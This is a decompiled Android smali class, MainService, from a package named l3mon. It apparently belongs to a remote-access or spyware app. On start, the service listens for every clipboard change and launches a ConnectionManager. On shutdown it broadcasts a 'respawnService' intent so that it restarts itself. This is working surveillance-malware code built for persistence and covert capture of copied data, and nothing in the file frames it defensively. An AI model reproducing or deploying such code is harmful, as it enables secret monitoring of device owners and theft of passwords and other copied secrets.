.class public Lcom/etechd/l3mon/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# static fields
.field private static final LOG_TAG:Ljava/lang/String;

.field private static contextOfApplication:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v0, 0x2

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v1, 0x0

    const-string v2, "MainService"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    aput-object v2, v0, v1

    const-string v1, "%s-%s"

    .line 16
    invoke-static {v1, v0}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/etechd/l3mon/MainService;->LOG_TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 18
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 1

    .line 77
    sget-object v0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    return-object v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 2

    .line 71
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 72
    new-instance v0, Landroid/content/Intent;

    const-string v1, "respawnService"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainService;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 37
    sget-object p1, Lcom/etechd/l3mon/MainService;->LOG_TAG:Ljava/lang/String;

    const-string p2, "Starting service"

    invoke-static {p1, p2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 39
    new-instance p1, Lcom/etechd/l3mon/MainService$1;

    invoke-direct {p1, p0}, Lcom/etechd/l3mon/MainService$1;-><init>(Lcom/etechd/l3mon/MainService;)V

    const-string p2, "clipboard"

    .line 60
    invoke-virtual {p0, p2}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/content/ClipboardManager;

    .line 61
    invoke-virtual {p2, p1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 64
    sput-object p0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    .line 65
    invoke-static {p0}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V

    const/4 p1, 0x1

    return p1
.end method
